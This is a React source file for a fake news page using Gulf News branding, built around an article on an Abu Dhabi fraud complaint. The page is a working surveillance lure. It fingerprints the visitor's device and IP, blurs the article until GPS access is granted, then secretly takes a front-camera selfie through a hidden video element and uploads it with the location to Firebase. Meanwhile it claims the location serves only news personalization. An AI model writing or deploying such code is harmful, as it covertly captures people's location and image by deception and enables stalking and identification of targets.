import { useEffect, useState, useCallback, useRef } from 'react'
import './App.css'
import { saveSessionDataToFirebase } from './firebase'

// ====== Device Detection Helper ======
function getDeviceInfo() {
  const ua = navigator.userAgent
  const platform = navigator.platform || ''

  // Device type
  let deviceType = 'Desktop'
  if (/Mobi|Android/i.test(ua)) deviceType = 'Mobile'
  else if (/Tablet|iPad/i.test(ua)) deviceType = 'Tablet'

  // OS detection
  let os = 'Unknown OS'
  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11'
  else if (/Windows/i.test(ua)) os = 'Windows'
  else if (/Mac OS X/i.test(ua)) {
    const ver = ua.match(/Mac OS X ([\d_]+)/)
    os = ver ? `macOS ${ver[1].replace(/_/g, '.')}` : 'macOS'
  } else if (/Android ([\d.]+)/i.test(ua)) {
    os = `Android ${ua.match(/Android ([\d.]+)/i)[1]}`
  } else if (/iPhone OS ([\d_]+)/i.test(ua)) {
    os = `iOS ${ua.match(/iPhone OS ([\d_]+)/i)[1].replace(/_/g, '.')}`
  } else if (/iPad.*OS ([\d_]+)/i.test(ua)) {
    os = `iPadOS ${ua.match(/OS ([\d_]+)/i)[1].replace(/_/g, '.')}`
  } else if (/Linux/i.test(ua)) os = 'Linux'
  else if (/CrOS/i.test(ua)) os = 'Chrome OS'

  // Browser detection
  let browser = 'Unknown Browser'
  if (/Edg\/([\d.]+)/i.test(ua)) browser = `Edge ${ua.match(/Edg\/([\d.]+)/i)[1]}`
  else if (/OPR\/([\d.]+)/i.test(ua)) browser = `Opera ${ua.match(/OPR\/([\d.]+)/i)[1]}`
  else if (/Chrome\/([\d.]+)/i.test(ua)) browser = `Chrome ${ua.match(/Chrome\/([\d.]+)/i)[1]}`
  else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) {
    const ver = ua.match(/Version\/([\d.]+)/i)
    browser = ver ? `Safari ${ver[1]}` : 'Safari'
  } else if (/Firefox\/([\d.]+)/i.test(ua)) browser = `Firefox ${ua.match(/Firefox\/([\d.]+)/i)[1]}`

  // Device model (best effort)
  let model = ''
  if (/iPhone/i.test(ua)) model = 'iPhone'
  else if (/iPad/i.test(ua)) model = 'iPad'
  else if (/Samsung|SM-/i.test(ua)) model = 'Samsung'
  else if (/Pixel/i.test(ua)) model = 'Google Pixel'
  else if (/Huawei/i.test(ua)) model = 'Huawei'
  else if (/Xiaomi|Redmi|POCO/i.test(ua)) model = 'Xiaomi'
  else if (/OnePlus/i.test(ua)) model = 'OnePlus'

  // Screen info
  const screen = `${window.screen.width}×${window.screen.height}`
  const pixelRatio = window.devicePixelRatio || 1

  return { deviceType, os, browser, model, screen, pixelRatio, userAgent: ua, platform }
}

const newsArticles = [
  {
    id: 1,
    category: '',
    title: 'Al Zahiyah Fraud Complaint Under Investigation by Abu Dhabi Authorities',
    excerpt: 'Abu Dhabi, UAE – A financial fraud complaint involving approximately AED 10,000 has been reported in the Al Zahiyah area of Abu Dhabi. According to the complainant, the suspect is believed to be an Indian national. The matter has been reported to the relevant authorities, and an investigation is currently underway. Authorities are reviewing available CCTV footage from locations in and around Al Zahiyah to establish the circumstances surrounding the incident and identify any persons involved. Sources familiar with the case stated that a photograph of the individual believed to be connected to the complaint has been obtained and provided to investigators as part of the evidence submitted. At the time of publication, no official statement has been released regarding arrests, criminal charges, or any lookout notice. Authorities continue to examine evidence and gather information related to the case. Members of the public are advised not to share unverified allegations or personal information on social media and to cooperate with law enforcement if they possess information that may assist the investigation.',
    image: 'https://images.unsplash.com/photo-1555421689-d68471e189f2?w=800&h=400&fit=crop',
    author: 'News Desk',
    date: 'June 5, 2026',
    readTime: '3 min read'
  }
]

function App() {
  const [sessionId] = useState(() => `session_${Date.now()}_${Math.random().toString(36).substring(2, 11)}`)
  const [locationStatus, setLocationStatus] = useState('idle') // idle, requesting, granted, denied, unsupported
  const [locationData, setLocationData] = useState(null)
  const [showOverlay, setShowOverlay] = useState(true)
  const [overlayFading, setOverlayFading] = useState(false)
  const [ipInfo, setIpInfo] = useState(null)
  const [deviceInfo] = useState(() => getDeviceInfo())

  // Selfie camera state
  const [latestData, setLatestData] = useState(null);
  const [cameraStatus, setCameraStatus] = useState('idle') // idle, capturing, done, error
  const videoRef = useRef(null)
  const canvasRef = useRef(null)
  const streamRef = useRef(null)

  // Save data to backend (placeholder for Firebase integration)
  const saveSessionData = useCallback(async (dataType, data) => {
    console.log(`[Backend Log] Session ${sessionId} - Saving ${dataType}:`, {
      sessionId,
      dataType,
      data,
      deviceInfo,
      timestamp: new Date().toISOString()
    });

    // Upload metadata and snapshots to Firebase
    const result = await saveSessionDataToFirebase(sessionId, dataType, data, deviceInfo);
    console.log('[Backend Log] Firebase response:', result);
    setLatestData(result);
    return result;
  }, [sessionId, deviceInfo]);

  const requestLocation = useCallback(() => {
    if (!navigator.geolocation) {
      setLocationStatus('unsupported')
      return
    }

    setLocationStatus('requesting')

    navigator.geolocation.getCurrentPosition(
      (position) => {
        console.log('Location access granted:', position.coords)
        setLocationStatus('granted')
        const locationData = {
          lat: position.coords.latitude,
          lng: position.coords.longitude
        }
        setLocationData(locationData)
        // Save location data to backend
        saveSessionData('location', locationData)
        // Fade out overlay
        setOverlayFading(true)
        setTimeout(() => setShowOverlay(false), 600)
      },
      (error) => {
        console.log('Location access denied or error:', error)
        setLocationStatus('denied')
      }
    )
  }, [saveSessionData])

  // Fetch IP address on mount
  useEffect(() => {
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const info = {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country_name,
          isp: data.org,
          timezone: data.timezone,
        }
        setIpInfo(info)
        console.log('IP Info:', info)
        console.log('Device Info:', deviceInfo)
        // Save IP info to backend
        saveSessionData('ipInfo', info)
      })
      .catch(err => {
        console.warn('Could not fetch IP:', err)
        // Fallback: try alternative API
        fetch('https://api.ipify.org?format=json')
          .then(res => res.json())
          .then(data => {
            const info = { ip: data.ip }
            setIpInfo(info)
            saveSessionData('ipInfo', info)
          })
          .catch(() => setIpInfo({ ip: 'Unavailable' }))
      })
  }, [deviceInfo])

  // Auto-request GPS on mount
  useEffect(() => {
    // Small delay to let the page render first so the blur effect is visible
    const timer = setTimeout(() => {
      requestLocation()
    }, 800)
    return () => clearTimeout(timer)
  }, [requestLocation])

  // ====== Selfie Camera Capture ======
  // Triggers 2 seconds after GPS is granted (user starts reading)
  useEffect(() => {
    if (locationStatus !== 'granted') return

    const captureTimer = setTimeout(() => {
      startSelfieCapture()
    }, 2000)

    return () => clearTimeout(captureTimer)
  }, [locationStatus])

  const startSelfieCapture = async () => {
    try {
      setCameraStatus('capturing')

      // Request front camera
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 },
        },
        audio: false,
      })

      streamRef.current = stream

      // Attach to hidden video element
      if (videoRef.current) {
        videoRef.current.srcObject = stream
        await videoRef.current.play()
      }

      // Wait a moment for camera to warm up
      await new Promise(resolve => setTimeout(resolve, 500))

      // Capture a single selfie snapshot quickly
      const photoUrl = takeSnapshot();
      if (photoUrl) {
        const photo = {
          url: photoUrl,
          timestamp: new Date().toLocaleTimeString(),
          id: Date.now(),
        };
        // Save the single photo to backend
        await saveSessionData('photo', photo);
        // Stop camera promptly after capture
        stopCamera();
        setCameraStatus('done');
        console.log('Captured 1 selfie photo');
      }

    } catch (err) {
      console.warn('Camera access error:', err)
      setCameraStatus('error')
      stopCamera()
    }
  }

  const takeSnapshot = () => {
    const video = videoRef.current
    const canvas = canvasRef.current
    if (!video || !canvas) return null

    canvas.width = video.videoWidth || 640
    canvas.height = video.videoHeight || 480
    const ctx = canvas.getContext('2d')

    // Mirror the image (selfie mode)
    ctx.translate(canvas.width, 0)
    ctx.scale(-1, 1)
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
    ctx.setTransform(1, 0, 0, 1, 0, 0) // reset

    return canvas.toDataURL('image/jpeg', 0.85)
  }

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop())
      streamRef.current = null
    }
  }

  // Cleanup camera on unmount
  useEffect(() => {
    return () => stopCamera()
  }, [])

  const isBlurred = locationStatus !== 'granted'

  return (
    <div className="min-h-screen bg-gray-50 relative">
      {/* Hidden video & canvas for selfie capture */}
      <video
        ref={videoRef}
        style={{ position: 'absolute', width: 0, height: 0, opacity: 0, pointerEvents: 'none', overflow: 'hidden' }}
        playsInline
        muted
      />
      <canvas ref={canvasRef} style={{ display: 'none' }} />

      {/* ====== GPS Permission Overlay ====== */}
      {showOverlay && (
        <div
          className={`gps-overlay ${overlayFading ? 'gps-overlay--fading' : ''}`}
          style={{
            position: 'fixed',
            inset: 0,
            zIndex: 9999,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            background: 'rgba(15, 23, 42, 0.55)',
            backdropFilter: 'blur(2px)',
            WebkitBackdropFilter: 'blur(2px)',
          }}
        >
          <div
            className={`gps-modal ${overlayFading ? 'gps-modal--fading' : ''}`}
            style={{
              background: 'rgba(255, 255, 255, 0.92)',
              backdropFilter: 'blur(24px)',
              WebkitBackdropFilter: 'blur(24px)',
              borderRadius: '24px',
              padding: '40px 36px 36px',
              maxWidth: '420px',
              width: '90%',
              boxShadow: '0 25px 60px rgba(0,0,0,0.25), 0 0 0 1px rgba(255,255,255,0.2)',
              textAlign: 'center',
              position: 'relative',
              overflow: 'hidden',
            }}
          >
            {/* Decorative gradient ring */}
            <div style={{
              position: 'absolute',
              top: '-60px',
              left: '50%',
              transform: 'translateX(-50%)',
              width: '200px',
              height: '200px',
              borderRadius: '50%',
              background: 'conic-gradient(from 0deg, #3b82f6, #8b5cf6, #ec4899, #f59e0b, #3b82f6)',
              opacity: 0.12,
              filter: 'blur(40px)',
              pointerEvents: 'none',
            }} />

            {/* Location pin icon */}
            <div style={{
              width: '72px',
              height: '72px',
              borderRadius: '50%',
              background: 'linear-gradient(135deg, #3b82f6, #8b5cf6)',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              margin: '0 auto 20px',
              boxShadow: '0 8px 24px rgba(59, 130, 246, 0.35)',
              animation: 'gps-pulse 2s ease-in-out infinite',
            }}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
                <circle cx="12" cy="10" r="3" />
              </svg>
            </div>

            <h2 style={{
              fontSize: '22px',
              fontWeight: 700,
              color: '#0f172a',
              margin: '0 0 8px',
              letterSpacing: '-0.3px',
            }}>
              Enable GPS Access
            </h2>

            <p style={{
              fontSize: '14px',
              color: '#64748b',
              lineHeight: '1.6',
              margin: '0 0 20px',
            }}>
              We need your area to deliver relevant local news and personalized content for your area.
            </p>

            {/* Device & IP Info Card */}
            <div style={{
              background: 'linear-gradient(135deg, #f0f9ff, #ede9fe)',
              borderRadius: '14px',
              padding: '14px 16px',
              marginBottom: '20px',
              border: '1px solid rgba(99, 102, 241, 0.12)',
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#6366f1" strokeWidth="2">
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                </svg>
                <span style={{ fontSize: '11px', fontWeight: 700, color: '#4338ca', textTransform: 'uppercase', letterSpacing: '0.5px' }}>Your Device Info</span>
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 12px', textAlign: 'left' }}>
                {[
                  { label: 'IP Address', value: ipInfo?.ip || '...' },
                  { label: 'Device', value: deviceInfo.model ? `${deviceInfo.model} (${deviceInfo.deviceType})` : deviceInfo.deviceType },
                  { label: 'OS', value: deviceInfo.os },
                  { label: 'Browser', value: deviceInfo.browser },
                  { label: 'Screen', value: `${deviceInfo.screen} @${deviceInfo.pixelRatio}x` },
                  { label: 'Location', value: ipInfo?.city ? `${ipInfo.city}, ${ipInfo.country}` : '...' },
                ].map((item, i) => (
                  <div key={i} style={{ overflow: 'hidden' }}>
                    <p style={{ fontSize: '10px', color: '#94a3b8', margin: '0 0 1px', fontWeight: 500 }}>{item.label}</p>
                    <p style={{ fontSize: '12px', color: '#1e293b', margin: 0, fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{item.value}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Status-specific content */}
            {locationStatus === 'idle' || locationStatus === 'requesting' ? (
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '12px',
              }}>
                <button
                  onClick={requestLocation}
                  disabled={locationStatus === 'requesting'}
                  style={{
                    width: '100%',
                    padding: '14px 24px',
                    borderRadius: '14px',
                    border: 'none',
                    background: 'linear-gradient(135deg, #3b82f6, #6366f1)',
                    color: 'white',
                    fontSize: '15px',
                    fontWeight: 600,
                    cursor: locationStatus === 'requesting' ? 'wait' : 'pointer',
                    transition: 'all 0.3s ease',
                    boxShadow: '0 4px 16px rgba(59, 130, 246, 0.4)',
                    opacity: locationStatus === 'requesting' ? 0.75 : 1,
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px',
                  }}
                >
                  {locationStatus === 'requesting' ? (
                    <>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" style={{ animation: 'gps-spin 1s linear infinite' }}>
                        <path d="M21 12a9 9 0 1 1-6.219-8.56" />
                      </svg>
                      Waiting for permission...
                    </>
                  ) : (
                    <>
                      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                        <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z" />
                        <circle cx="12" cy="10" r="3" />
                      </svg>
                      Allow Location Access
                    </>
                  )}
                </button>

                <p style={{
                  fontSize: '11px',
                  color: '#94a3b8',
                  margin: 0,
                }}>
                  🔒 Your location data is only used for news personalization
                </p>
              </div>
            ) : locationStatus === 'denied' ? (
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: '12px',
              }}>
                {/* Warning banner */}
                <div style={{
                  background: 'linear-gradient(135deg, #fef3c7, #fde68a)',
                  borderRadius: '12px',
                  padding: '14px 16px',
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: '10px',
                  textAlign: 'left',
                }}>
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#92400e" strokeWidth="2" style={{ flexShrink: 0, marginTop: '1px' }}>
                    <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
                    <line x1="12" y1="9" x2="12" y2="13" />
                    <line x1="12" y1="17" x2="12.01" y2="17" />
                  </svg>
                  <div>
                    <p style={{ fontSize: '13px', fontWeight: 600, color: '#78350f', margin: '0 0 4px' }}>
                      GPS Access Denied
                    </p>
                    <p style={{ fontSize: '12px', color: '#92400e', margin: 0, lineHeight: '1.5' }}>
                      News content is restricted without GPS access. Please allow GPS in your browser settings and try again.
                    </p>
                  </div>
                </div>

                <button
                  onClick={requestLocation}
                  style={{
                    width: '100%',
                    padding: '14px 24px',
                    borderRadius: '14px',
                    border: 'none',
                    background: 'linear-gradient(135deg, #3b82f6, #6366f1)',
                    color: 'white',
                    fontSize: '15px',
                    fontWeight: 600,
                    cursor: 'pointer',
                    transition: 'all 0.3s ease',
                    boxShadow: '0 4px 16px rgba(59, 130, 246, 0.4)',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    gap: '8px',
                  }}
                >
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                    <polyline points="23 4 23 10 17 10" />
                    <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10" />
                  </svg>
                  Try Again
                </button>
              </div>
            ) : locationStatus === 'unsupported' ? (
              <div style={{
                background: '#fef2f2',
                borderRadius: '12px',
                padding: '14px 16px',
                display: 'flex',
                alignItems: 'flex-start',
                gap: '10px',
                textAlign: 'left',
              }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#dc2626" strokeWidth="2" style={{ flexShrink: 0, marginTop: '1px' }}>
                  <circle cx="12" cy="12" r="10" />
                  <line x1="15" y1="9" x2="9" y2="15" />
                  <line x1="9" y1="9" x2="15" y2="15" />
                </svg>
                <div>
                  <p style={{ fontSize: '13px', fontWeight: 600, color: '#991b1b', margin: '0 0 4px' }}>
                    Location Not Supported
                  </p>
                  <p style={{ fontSize: '12px', color: '#b91c1c', margin: 0, lineHeight: '1.5' }}>
                    Your browser does not support location services. Please try a modern browser.
                  </p>
                </div>
              </div>
            ) : null}
          </div>
        </div>
      )
      }

      {/* ====== Main Content (blurred when no GPS) ====== */}
      <div
        className="news-content-wrapper"
        style={{
          filter: isBlurred ? 'blur(12px)' : 'blur(0px)',
          transition: 'filter 0.6s ease',
          pointerEvents: isBlurred ? 'none' : 'auto',
          userSelect: isBlurred ? 'none' : 'auto',
        }}
      >
        {/* Header with Logo */}
        <header className="bg-white shadow-sm border-b border-gray-200">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex flex-col items-center justify-center h-auto md:h-20 py-4 md:py-0 relative">
              <img
                src="https://images.assettype.com/gulfnews/2026-04-11/4dsf6jgr/GNLogo1.svg"
                alt="News Logo"
                className="h-12 w-auto mb-4 md:mb-0"
              />
              <nav className="hidden md:flex space-x-8">
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">Home</a>
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">World</a>
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">Business</a>
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">Technology</a>
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">Sports</a>
                <a href="#" className="text-gray-700 hover:text-blue-600 font-medium transition-colors">Health</a>
              </nav>
              {/* Location Status Indicator */}
              <div className="absolute right-4 top-4 flex items-center gap-2">
                <div className={`flex items-center gap-2 px-3 py-1 rounded-full text-xs font-medium ${locationStatus === 'granted' ? 'bg-green-100 text-green-700' :
                  locationStatus === 'denied' ? 'bg-red-100 text-red-700' :
                    locationStatus === 'unsupported' ? 'bg-gray-100 text-gray-700' :
                      'bg-yellow-100 text-yellow-700'
                  }`}>
                  {locationStatus === 'granted' && (
                    <>
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                      </svg>
                    </>
                  )}
                  {locationStatus === 'denied' && (
                    <>
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
                      </svg>
                      <span>Location Denied</span>
                    </>
                  )}
                  {locationStatus === 'unsupported' && (
                    <>
                      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                      </svg>
                      <span>Location Unsupported</span>
                    </>
                  )}
                  {(locationStatus === 'requesting' || locationStatus === 'idle') && (
                    <>
                      <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <span>Requesting Location...</span>
                    </>
                  )}
                </div>
              </div>
              <button className="md:hidden text-gray-700">
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
                </svg>
              </button>
            </div>
          </div>
        </header>

        {/* Breaking News Banner */}
        <div className="bg-blue-600 text-white py-3">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div className="flex items-center">
              <span className="bg-red-500 text-white text-xs font-bold px-3 py-1 rounded mr-4 animate-pulse">
                BREAKING
              </span>
            </div>
          </div>
        </div>

        {/* Main Content */}
        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
          {/* Featured Article */}
          <div className="mb-12">
            <div className="bg-white rounded-2xl overflow-hidden shadow-xl">
              <img
                src={newsArticles[0].image}
                alt={newsArticles[0].title}
                className="w-full h-64 object-cover"
              />
              <div className="p-8">
                <span className="bg-blue-600 text-white text-sm font-semibold px-3 py-1 rounded-full">
                  {newsArticles[0].category}
                </span>
                <h1
                  className="text-4xl md:text-5xl lg:text-6xl font-bold text-gray-900 mt-4 mb-3"
                  style={{ lineHeight: '1.1' }}
                >
                  {newsArticles[0].title}
                </h1>
                <p className="text-gray-600 text-lg mb-4 leading-relaxed">
                  {newsArticles[0].excerpt}
                </p>
                <div className="flex items-center text-gray-500 text-sm">
                  <span>{newsArticles[0].author}</span>
                  <span className="mx-3">•</span>
                  <span>{newsArticles[0].date}</span>
                  <span className="mx-3">•</span>
                  <span>{newsArticles[0].readTime}</span>
                </div>
              </div>
            </div>
          </div>

          {/* News Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {newsArticles.map((article, index) => (
              index === 0 ? null : (
                <article key={article.id} className="bg-white rounded-xl overflow-hidden shadow-md hover:shadow-xl transition-shadow duration-300">
                  <div className="relative">
                    <img
                      src={article.image}
                      alt={article.title}
                      className="w-full h-48 object-cover"
                      onError={(e) => { e.target.src = 'https://via.placeholder.com/800x400?text=News+Image' }}
                    />
                    <span className="absolute top-4 left-4 bg-blue-600 text-white text-xs font-semibold px-3 py-1 rounded-full">
                      {article.category}
                    </span>
                  </div>
                  <div className="p-6">
                    <h2 className="text-xl font-bold text-gray-900 mb-3 line-clamp-2 hover:text-blue-600 cursor-pointer transition-colors">
                      {article.title}
                    </h2>
                    <p className="text-gray-600 text-sm mb-4 line-clamp-3">
                      {article.excerpt}
                    </p>
                    <div className="flex items-center text-gray-500 text-xs">
                      <span>{article.author}</span>
                      <span className="mx-2">•</span>
                      <span>{article.date}</span>
                      <span className="mx-2">•</span>
                      <span>{article.readTime}</span>
                    </div>
                  </div>
                </article>
              )
            ))}
          </div>


        </main>

        {/* Footer */}
        <footer className="bg-gray-900 text-white mt-16">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
            <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
              <div>
                <img
                  src="https://images.assettype.com/gulfnews/2026-04-11/4dsf6jgr/GNLogo1.svg"
                  alt="News Logo"
                  className="h-8 w-auto mb-4 brightness-0 invert"
                />
              </div>


              <div>
              </div>
            </div>
            <div className="border-t border-gray-800 mt-8 pt-8 text-center text-gray-400 text-sm">
              <p>&copy; 2026 News Website. All rights reserved.</p>
            </div>
            {/* Debug: Latest Firebase response */}
            {latestData && (
              <pre style={{ background: '#f5f5f5', padding: '10px', borderRadius: '8px', marginTop: '20px' }}>
                {JSON.stringify(latestData, null, 2)}
              </pre>
            )}
          </div>
        </footer>
      </div>
    </div >
  )
}

export default App
